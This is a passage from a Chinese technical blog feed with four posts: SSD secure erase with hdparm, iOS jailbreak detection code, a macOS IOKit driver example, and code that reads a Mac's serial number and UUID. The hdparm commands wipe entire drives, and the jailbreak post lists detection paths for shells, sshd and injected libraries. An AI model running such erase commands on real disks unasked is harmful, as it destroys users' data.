SSD安全擦除原理和工具</h3><p>ATA安全擦除命令用来清除在磁盘上的所有用户数据，这个指令会让SSD回到出厂时的性能（最优性能，最少写入放大），但是随着使用时间变长，GC操作恢复后，写入放大又会慢慢增加回来。许多软件使用ATA安全擦除指令来重置磁盘，最著名的为HDDErase。对SSD来说，重置就是（除了OP区域内的部分私有区域外的）全盘擦除操作，瞬间即可完成清除所有数据让SSD回到初始状态。但要注意，每操作一次，全盘寿命P/E次数减1。</p><h4 id="使用hdparm进行安全擦除步骤"><a href="#使用hdparm进行安全擦除步骤" class="headerlink" title="使用hdparm进行安全擦除步骤"></a>使用hdparm进行安全擦除步骤</h4><h4 id="Step-1-确保驱动器安全未冻结："><a href="#Step-1-确保驱动器安全未冻结：" class="headerlink" title="Step 1 - 确保驱动器安全未冻结："></a>Step 1 - 确保驱动器安全未冻结：</h4><p>发送以下命令，X为对应的设备（如sda）</p><p><code>hdparm -I /dev/X</code></p><p>命令输出（确保驱动器”not frozen”）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">Security: </div><div class="line">       Master password revision code = 65534</div><div class="line">               supported</div><div class="line">       not     enabled</div><div class="line">       not     locked</div><div class="line">     [ not     frozen ]</div><div class="line">       not     expired: security count</div><div class="line">               supported: enhanced erase</div><div class="line">       2min for SECURITY ERASE UNIT. 2min for ENHANCED SECURITY ERASE UNIT.</div></pre></td></tr></table></figure><p>如果命令输出显示为”frozen”，那么不能继续下一步。<br>如果您的驱动器被冻结并启用了密码，请尝试使用BIOS删除密码，并关闭系统电源，看看是否禁用冻结。否则，您可能需要使用不同的主板（使用不同的BIOS）。</p><h4 id="Step-2-通过设置用户密码启用安全性："><a href="#Step-2-通过设置用户密码启用安全性：" class="headerlink" title="Step 2 - 通过设置用户密码启用安全性："></a>Step 2 - 通过设置用户密码启用安全性：</h4><p><strong>警告：设置用户密码后，下一次上电后驱动器将被锁定（只有使用正确的密码解锁，不然驱动器将拒绝正常访问）。</strong></p><h5 id="Step-2a-设置用户密码："><a href="#Step-2a-设置用户密码：" class="headerlink" title="Step 2a - 设置用户密码："></a>Step 2a - 设置用户密码：</h5><p>任何密码都可以，因为这只能是临时的。安全擦除后，密码将设置为NULL。在这里，我们将使用密码“Eins”。</p><p><code>hdparm --user-master u --security-set-pass Eins /dev/X</code></p><p>命令输出:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">security_password=&quot;Eins&quot;</div><div class="line"></div><div class="line">/dev/sdd:</div><div class="line">Issuing SECURITY_SET_PASS command, password=&quot;Eins&quot;, user=user, mode=high</div></pre></td></tr></table></figure><h5 id="Step-2b-成功后然后执行"><a href="#Step-2b-成功后然后执行" class="headerlink" title="Step 2b - 成功后然后执行"></a>Step 2b - 成功后然后执行</h5><p><code>hdparm -I /dev/X</code></p><p>命令输出(应显示为”enable”)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Security: </div><div class="line">       Master password revision code = 65534</div><div class="line">               supported</div><div class="line">             [ enabled ]</div><div class="line">       not     locked</div><div class="line">       not     frozen</div><div class="line">       not     expired: security count</div><div class="line">               supported: enhanced erase</div><div class="line">       Security level high</div><div class="line">       2min for SECURITY ERASE UNIT. 2min for ENHANCED SECURITY ERASE UNIT.</div></pre></td></tr></table></figure><h4 id="Step-3-发送ATA安全擦除命令"><a href="#Step-3-发送ATA安全擦除命令" class="headerlink" title="Step 3 - 发送ATA安全擦除命令:"></a>Step 3 - 发送ATA安全擦除命令:</h4><p><code>time hdparm --user-master u --security-erase Eins /dev/X</code></p><p>等待命令完成,此示例输出显示Intel X25-M 80GB SSD花费大约40秒<br>命令输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">security_password=&quot;Eins&quot;</div><div class="line"></div><div class="line"> /dev/sdd:</div><div class="line">Issuing SECURITY_ERASE command, password=&quot;Eins&quot;, user=user</div><div class="line">0.000u 0.000s 0:39.71 0.0%      0+0k 0+0io 0pf+0w</div></pre></td></tr></table></figure><h4 id="Step-4-驱动器已经被擦除，-验证安全性是否禁用"><a href="#Step-4-驱动器已经被擦除，-验证安全性是否禁用" class="headerlink" title="Step 4 - 驱动器已经被擦除， 验证安全性是否禁用:"></a>Step 4 - 驱动器已经被擦除， 验证安全性是否禁用:</h4><p>成功擦除后，驱动器安全性应自动设置为禁用（因此不再需要访问密码）。通过运行以下命令验证这一点：</p><p><code>hdparm -I /dev/X</code></p><p>命令输出（应显示为禁用）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">Security: </div><div class="line">       Master password revision code = 65534</div><div class="line">               supported</div><div class="line">     [ not     enabled ]</div><div class="line">       not     locked</div><div class="line">       not     frozen</div><div class="line">       not     expired: security count</div><div class="line">               supported: enhanced erase</div><div class="line">       2min for SECURITY ERASE UNIT. 2min for ENHANCED SECURITY ERASE UNIT.</div></pre></td></tr></table></figure><h3 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h3><ul><li><a href="http://rick_stone.leanote.com/post/%E8%AF%B4%E8%B5%B7%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E5%92%8C%E5%9B%BA%E6%80%81%E7%A1%AC%E7%9B%98%EF%BC%88%E4%BA%8C%EF%BC%89" target="_blank" rel="external">http://rick_stone.leanote.com/post/%E8%AF%B4%E8%B5%B7%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E5%92%8C%E5%9B%BA%E6%80%81%E7%A1%AC%E7%9B%98%EF%BC%88%E4%BA%8C%EF%BC%89</a></li><li><a href="http://www.jinbuguo.com/storage/ssd_intro.html" target="_blank" rel="external">http://www.jinbuguo.com/storage/ssd_intro.html</a></li><li><a href="https://ata.wiki.kernel.org/index.php/ATA_Secure_Erase" target="_blank" rel="external">https://ata.wiki.kernel.org/index.php/ATA_Secure_Erase</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SSD与安全擦除&quot;&gt;&lt;a href=&quot;#SSD与安全擦除&quot; class=&quot;headerlink&quot; title=&quot;SSD与安全擦除&quot;&gt;&lt;/a&gt;SSD与安全擦除&lt;/h2&gt;&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;目录&lt;br&gt;0x01 SSD简介&lt;br&gt;
      
    
    </summary>
    
      <category term="杂" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/%E6%9D%82/"/>
    
    
      <category term="SSD" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/SSD/"/>
    
  </entry>
  
  <entry>
    <title>常见iOS越狱检测手段</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/07/iOS%E8%B6%8A%E7%8B%B1%E6%A3%80%E6%B5%8B/iOS%E8%B6%8A%E7%8B%B1%E6%A3%80%E6%B5%8B/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/07/iOS越狱检测/iOS越狱检测/</id>
    <published>2017-08-07T10:37:59.000Z</published>
    <updated>2017-08-07T10:41:31.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="iOS越狱检测"><a href="#iOS越狱检测" class="headerlink" title="iOS越狱检测"></a>iOS越狱检测</h2><blockquote><blockquote><p>如何检测越狱其实就是检测越狱后与非越狱的差异。一句话说明越狱检测原理主要便是检测相关权限，也很容易想到，因为越狱使得权限很大得到了提升。比如某些目录是否能访问，是否安装某些动态库，是否安装某些app等，另外建议对检测的类名及方法名进行混淆，对关键字符串进行加密等手段。</p><p>注:以下代码均已在真机上测试完成<br>Demo工程代码<a href="https://github.com/NULL-ME/NULL-ME.github.io/tree/master/articlePic/JailbreakCheckDemo">地址</a></p></blockquote></blockquote><h3 id="1-使用NSFileManager检测是否安装常见越狱工具"><a href="#1-使用NSFileManager检测是否安装常见越狱工具" class="headerlink" title="1. 使用NSFileManager检测是否安装常见越狱工具"></a>1. 使用NSFileManager检测是否安装常见越狱工具</h3><p>注：采用<code>NSFileManager</code>存在可能被hook的情况，最好结合底层<code>stat</code>等函数双重检测</p><p><strong>示例代码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">/* </div><div class="line">常见越狱工具路径：</div><div class="line">/Library/MobileSubstrate/MobileSubstrate.dylib </div><div class="line">/Applications/Cydia.app   </div><div class="line">/var/lib/cydia/</div><div class="line">/var/cache/apt   </div><div class="line">/var/lib/apt    </div><div class="line">/etc/apt </div><div class="line">/bin/bash </div><div class="line">/bin/sh </div><div class="line">/usr/sbin/sshd   </div><div class="line">/usr/libexec/ssh-keysign   </div><div class="line">/etc/ssh/sshd_config</div><div class="line">*/</div><div class="line"></div><div class="line">- (BOOL)checkPath</div><div class="line">&#123;</div><div class="line"> BOOL jailBroken = NO;</div><div class="line"></div><div class="line"> NSString * aptPath = @&quot;/private/var/lib/apt&quot;;</div><div class="line"></div><div class="line"> if ([[NSFileManager defaultManager] fileExistsAtPath:aptPath]) &#123;</div><div class="line">     jailBroken = YES;</div><div class="line"> &#125;</div><div class="line"> </div><div class="line">return jailBroken;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="2-使用stat系列函数检测常用越狱工具"><a href="#2-使用stat系列函数检测常用越狱工具" class="headerlink" title="2. 使用stat系列函数检测常用越狱工具"></a>2. 使用stat系列函数检测常用越狱工具</h3><p><strong>示例代码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">//头文件 #import &lt;sys/stat.h&gt;</div><div class="line">//路径同上</div><div class="line">//使用stat系列函数检测</div><div class="line"></div><div class="line">    struct stat stat_info;</div><div class="line"></div><div class="line">    if (0 == stat(&quot;/Applications/Cydia.app&quot;, &amp;stat_info)) &#123;</div><div class="line">        jailbroken = YES;</div><div class="line">    &#125;</div></pre></td></tr></table></figure><p>检测stat是否被替换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">int ret;</div><div class="line"></div><div class="line">Dl_info dylib_info;</div><div class="line"></div><div class="line">int (*func_stat)(const char *,struct stat *) = stat;</div><div class="line"></div><div class="line">if ((ret = dladdr(func_stat, &amp;dylib_info))) &#123;</div><div class="line">    if (strcmp(dylib_info.dli_fname,&quot;/usr/lib/system/libsystem_kernel.dylib&quot;) != 0) &#123; </div><div class="line">      jailbroken = YES; </div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="3-检测程序运行的环境变量"><a href="#3-检测程序运行的环境变量" class="headerlink" title="3.检测程序运行的环境变量"></a>3.检测程序运行的环境变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">//检测当前程序运行的环境变量，防止通过DYLD_INSERT_LIBRARIES注入链接异常动态库，来更改相关工具名称</div><div class="line">- (BOOL)checkEnv</div><div class="line">&#123;</div><div class="line"> char *env = getenv(&quot;DYLD_INSERT_LIBRARIES&quot;);</div><div class="line"> </div><div class="line"> NSLog(@&quot;%s&quot;, env);</div><div class="line"> </div><div class="line"> if (env) &#123;</div><div class="line">     return YES;</div><div class="line"> &#125;</div><div class="line">return NO;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="4-dylib动态库检测"><a href="#4-dylib动态库检测" class="headerlink" title="4.dylib动态库检测"></a>4.dylib动态库检测</h3><p><strong>示例代码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">//头文件 #import &lt;mach-o/dyld.h&gt;</div><div class="line">//几乎所有的越狱机都会安装 Library/MobileSubstrate/MobileSubstrate.dylib动态库</div><div class="line"></div><div class="line">    uint32_t count = _dyld_image_count();</div><div class="line"></div><div class="line">    for (uint32_t i = 0 ; i &lt; count; ++i) &#123;</div><div class="line"></div><div class="line">        NSString *name = [[NSString alloc]initWithUTF8String:_dyld_get_image_name(i)];</div><div class="line"></div><div class="line">        if ([name containsString:@&quot;Library/MobileSubstrate/MobileSubstrate.dylib&quot;]) &#123;</div><div class="line">            jailbroken = YES;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;</div></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><p><a href="http://www.jianshu.com/p/a43be50dc958" target="_blank" rel="external">http://www.jianshu.com/p/a43be50dc958</a></p></li><li><p><a href="http://www.freebuf.com/articles/wireless/6318.html" target="_blank" rel="external">http://www.freebuf.com/articles/wireless/6318.html</a></p></li></ul><ul><li><p><a href="http://www.jianshu.com/p/f664b1da8458" target="_blank" rel="external">http://www.jianshu.com/p/f664b1da8458</a></p></li><li><p><a href="http://www.jianshu.com/p/f220e63319eb" target="_blank" rel="external">http://www.jianshu.com/p/f220e63319eb</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;iOS越狱检测&quot;&gt;&lt;a href=&quot;#iOS越狱检测&quot; class=&quot;headerlink&quot; title=&quot;iOS越狱检测&quot;&gt;&lt;/a&gt;iOS越狱检测&lt;/h2&gt;&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;如何检测越狱其实就是检测越狱后与非越狱的差异。一
      
    
    </summary>
    
    
      <category term="iOS应用安全" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/iOS%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>内核扩展-驱动开发实例</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/03/%E5%86%85%E6%A0%B8%E6%89%A9%E5%B1%95-%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%E5%AE%9E%E4%BE%8B/%E5%86%85%E6%A0%B8%E6%89%A9%E5%B1%95-%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%E5%AE%9E%E4%BE%8B/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/03/内核扩展-驱动开发实例/内核扩展-驱动开发实例/</id>
    <published>2017-08-03T11:27:59.000Z</published>
    <updated>2017-08-04T02:06:54.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><blockquote><p>结合《OS X 内核编程》以及网上相关的学习，用一个例子来说明自己对macOS IOkit的理解</p></blockquote></blockquote><h2 id="0x00-一点概念"><a href="#0x00-一点概念" class="headerlink" title="0x00 一点概念"></a>0x00 一点概念</h2><p>操作系统可以理解成硬件的抽象或者说提供服务，如下图所示，在xnu内核之中，由mach微内核，IOKit，BSD三大组件构成。作为内核的一部分IOKit起着想当重要的作用，抽象IO设备，采用C++编写的IOKit框架使得硬件驱动具有模块化，便于扩展。<br><img src="/4ch12dy/4ch12dy.github.io.git/2017/08/03/内核扩展-驱动开发实例/内核扩展-驱动开发实例/king/4chendyBlog/blog/source/articlePic/kext/macOS框架.png" alt="mac0s框架"><br>程序难免会和相应的硬件交互，苹果定义了IOKit.framework，这个框架定义了一些与公共的接口，可以让用户层通过这些接口与一些标准的驱动程序进行交互。而驱动与用户程序之间到底是如何交互的？本篇就来分析其中的细节。</p><h2 id="0x01-驱动加载的过程"><a href="#0x01-驱动加载的过程" class="headerlink" title="0x01 驱动加载的过程"></a>0x01 驱动加载的过程</h2><p>当硬件插入电脑时，系统会根据硬件的类型创建一个Provider(提供者)的对象，并且这个Provider会在初使化的过程中去尝试匹配合适的驱动程序，如上图，我们开发一款适合于PCI声卡或USB音频设备的驱动程序，首先硬件载入后会去查找驱动程序Info.plist中的IOKitPersonalities的信息，如果IOProviderClass中定义了IOPCIDriver就表示可以为PCI做匹配，如果同时也有IOUSBDriver项就表示USB的设备也可以做匹配，同时如果有多个支持PCI或USB的驱动出现时，就会去调用驱动程序的probe方法，最终找到匹配度最高的驱动程序进行加载(实际的原理会更复杂)，然后该驱动程序就可以通过不同的Provider与硬件通信，并且通过标准的IOAudioDriver接口为系统提供音频的服务，从而用户程序就可以通过系统的标准方法最终让音频设备工作。<br><img src="/4ch12dy/4ch12dy.github.io.git/2017/08/03/内核扩展-驱动开发实例/内核扩展-驱动开发实例/king/4chendyBlog/blog/source/articlePic/kext/driver.png" alt="driver"></p><h2 id="0x02-创建驱动程序"><a href="#0x02-创建驱动程序" class="headerlink" title="0x02 创建驱动程序"></a>0x02 创建驱动程序</h2><p>打开Xcode，选择IOKit Driver模板，取名工程名IOKitTest，然后可以在工程中看到会自动创建两个文件，分别是IOKitTest.h和IOKitTest.cpp，但非常遗憾的是，模板并没有为我们在这两个文件中生成任何的内容。我们手动在IOKitTest.h中输入以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">#include &lt;IOKit/IOService.h&gt;</div><div class="line">class com_osxkernel_driver_IOKitTest : public IOService &#123;</div><div class="line">    </div><div class="line">    //一个宏定义，会自动生成该类的构造方法、析构方法和运行时</div><div class="line">    OSDeclareDefaultStructors(com_osxkernel_driver_IOKitTest)</div><div class="line">    </div><div class="line">public:</div><div class="line">    //该方法与Cocoa中的init和C++中的构造方法类似</div><div class="line">    virtual bool init(OSDictionary* dictionary = NULL);</div><div class="line">    //该方法与Cocoa中的dealloc和C++中的析构方法类似</div><div class="line">    virtual void free(void);</div><div class="line">    </div><div class="line">    //进行驱动匹配时调用</div><div class="line">    virtual IOService* probe(IOService* provider, SInt32* score);</div><div class="line">    //当匹配成功后加载驱动</div><div class="line">    virtual bool start(IOService *provider);</div><div class="line">    //当硬件移除时或卸载驱动</div><div class="line">    virtual void stop(IOService *provider);</div><div class="line">&#125;;</div></pre></td></tr></table></figure><p>在IOKitTest.cpp中输入以下的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line">#include &quot;IOKitTest.h&quot;</div><div class="line">#include &lt;IOKit/IOLib.h&gt;</div><div class="line">//让你拥有Cocoa中的super关键字一样的体验</div><div class="line">#define super IOService</div><div class="line">//和头文件中的宏定义类似，自动生成一些特定代码</div><div class="line">OSDefineMetaClassAndStructors(com_osxkernel_driver_IOKitTest, IOService)</div><div class="line">//该方法打印出dict的内容</div><div class="line">bool com_osxkernel_driver_IOKitTest::init(OSDictionary *dict)</div><div class="line">&#123;</div><div class="line">    bool res = super::init(dict);</div><div class="line">    IOLog(&quot;IOKitTest::init abcd\n&quot;);</div><div class="line">    </div><div class="line">    OSCollectionIterator *iter = OSCollectionIterator::withCollection(dict);</div><div class="line">    if (iter)</div><div class="line">    &#123;</div><div class="line">        OSObject *object = NULL;</div><div class="line">        while ((object = iter-&gt;getNextObject()))</div><div class="line">        &#123;</div><div class="line">            OSSymbol *key = OSDynamicCast(OSSymbol, object);</div><div class="line">            IOLog(&quot;key:%s  &quot;,key-&gt;getCStringNoCopy());</div><div class="line">            OSString *value = OSDynamicCast(OSString, dict-&gt;getObject(key));</div><div class="line">            if (value != NULL)</div><div class="line">            &#123;</div><div class="line">                IOLog(&quot;value:%s\n&quot;,value-&gt;getCStringNoCopy());</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    return res;</div><div class="line">&#125;</div><div class="line">void com_osxkernel_driver_IOKitTest::free(void)</div><div class="line">&#123;</div><div class="line">    IOLog(&quot;IOKitTest::free\n&quot;);</div><div class="line">    super::free();</div><div class="line">&#125;</div><div class="line">IOService* com_osxkernel_driver_IOKitTest::probe(IOService* provider, SInt32* score)</div><div class="line">&#123;</div><div class="line">    IOService *res = super::probe(provider, score);</div><div class="line">    IOLog(&quot;IOKitTest::probe\n&quot;);</div><div class="line">    return res;</div><div class="line">&#125;</div><div class="line">bool com_osxkernel_driver_IOKitTest::start(IOService *provider)</div><div class="line">&#123;</div><div class="line">    bool res = super::start(provider);</div><div class="line">    IOLog(&quot;IOKitTest::start\n&quot;);</div><div class="line">    //只有调用了此方法，应用层才可以连接该驱动</div><div class="line">    registerService();</div><div class="line">    return res;</div><div class="line">&#125;</div><div class="line">void com_osxkernel_driver_IOKitTest::stop(IOService *provider)</div><div class="line">&#123;</div><div class="line">    IOLog(&quot;IOKitTest::stop\n&quot;);</div><div class="line">    super::stop(provider);</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;结合《OS X 内核编程》以及网上相关的学习，用一个例子来说明自己对macOS IOkit的理解&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-一点概念&quot;&gt;&lt;a href=&quot;#0
      
    
    </summary>
    
    
      <category term="kext" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/kext/"/>
    
  </entry>
  
  <entry>
    <title>获取macOS序列号UUID等</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/01/%E8%8E%B7%E5%8F%96macOS%E5%BA%8F%E5%88%97%E5%8F%B7UUID%E7%AD%89/%E8%8E%B7%E5%8F%96macOS%E5%BA%8F%E5%88%97%E5%8F%B7UUID%E7%AD%89/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/01/获取macOS序列号UUID等/获取macOS序列号UUID等/</id>
    <published>2017-08-01T08:50:59.000Z</published>
    <updated>2017-08-30T01:47:33.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><blockquote><p>记录下，可能会用到</p></blockquote></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">+ (NSString *)serialNumber &#123;</div><div class="line">  io_service_t platformExpert = IOServiceGetMatchingService(</div><div class="line">      kIOMasterPortDefault, IOServiceMatching(&quot;IOPlatformExpertDevice&quot;));</div><div class="line">  if (!platformExpert) return nil;</div><div class="line"></div><div class="line">  NSString *serial = CFBridgingRelease(IORegistryEntryCreateCFProperty(</div><div class="line">      platformExpert, CFSTR(kIOPlatformSerialNumberKey), kCFAllocatorDefault, 0));</div><div class="line"></div><div class="line">  IOObjectRelease(platformExpert);</div><div class="line"></div><div class="line">  return serial;</div><div class="line">&#125;</div><div class="line"></div><div class="line">+ (NSString *)hardwareUUID &#123;</div><div class="line">  io_service_t platformExpert = IOServiceGetMatchingService(</div><div class="line">      kIOMasterPortDefault, IOServiceMatching(&quot;IOPlatformExpertDevice&quot;));</div><div class="line">  if (!platformExpert) return nil;</div><div class="line"></div><div class="line">  NSString *uuid = CFBridgingRelease(IORegistryEntryCreateCFProperty(</div><div class="line">      platformExpert, CFSTR(kIOPlatformUUIDKey), kCFAllocatorDefault, 0));</div><div class="line"></div><div class="line">  IOObjectRelease(platformExpert);</div><div class="line"></div><div class="line">  return uuid;</div><div class="line">&#125;</div><div class="line"></div><div class="line">+ (NSString *)osVersion &#123;</div><div class="line">  return [SNTSystemInfo _systemVersionDictionary][@&quot;ProductVersion&quot;];</div><div class="line">&#125;</div><div class="line"></div><div class="line">+ (NSString *)osBuild &#123;</div><div class="line">  return [SNTSystemInfo _systemVersionDictionary][@&quot;ProductBuildVersion&quot;];</div><div class="line">&#125;</div><div class="line"></div><div class="line">+ (NSString *)shortHostname &#123;</div><div class="line">  return [[[SNTSystemInfo longHostname] componentsSeparatedByString:@&quot;.&quot;] firstObject];</div><div class="line">&#125;</div><div class="line"></div><div class="line">+ (NSString *)longHostname &#123;</div><div class="line">  char hostname[MAXHOSTNAMELEN];</div><div class="line">  gethostname(hostname, (int)sizeof(hostname));</div><div class="line">  return @(hostname);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">serialnum:C02R****FVH5</div><div class="line">UUID:9C090ED8-****-540B-****-0C186E98FDFE</div></pre></td></tr></table></figure><h3 id="忽略一些警告的标识"><a href="#忽略一些警告的标识" class="headerlink" title="忽略一些警告的标识"></a>忽略一些警告的标识</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">#pragma clang diagnostic push</div><div class="line">#pragma clang diagnostic ignored &quot;警告名称&quot;</div><div class="line"></div><div class="line">￼// 被夹在这中间的代码针对于此警告都会忽视不显示出来</div><div class="line"></div><div class="line">//常见警告的名称</div><div class="line">//1.声明变量未使用  &quot;-Wunused-variable&quot;</div><div class="line">//2.方法定义未实现  &quot;-Wincomplete-implementation&quot;</div><div class="line">//3.未声明的选择器  &quot;-Wundeclared-selector&quot;</div><div class="line">//4.参数格式不匹配  &quot;-Wformat&quot;</div><div class="line">//5.废弃掉的方法     &quot;-Wdeprecated-declarations&quot;</div><div class="line">//6.不会执行的代码  &quot;-Wunreachable-code&quot;</div><div class="line">//7.忽略在arc 环境下performSelector产生的 leaks 的警告 &quot;-Warc-performSelector-leaks&quot;</div><div class="line"></div><div class="line">#pragma clang diagnostic pop</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;记录下，可能会用到&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;d
      
    
    </summary>
    
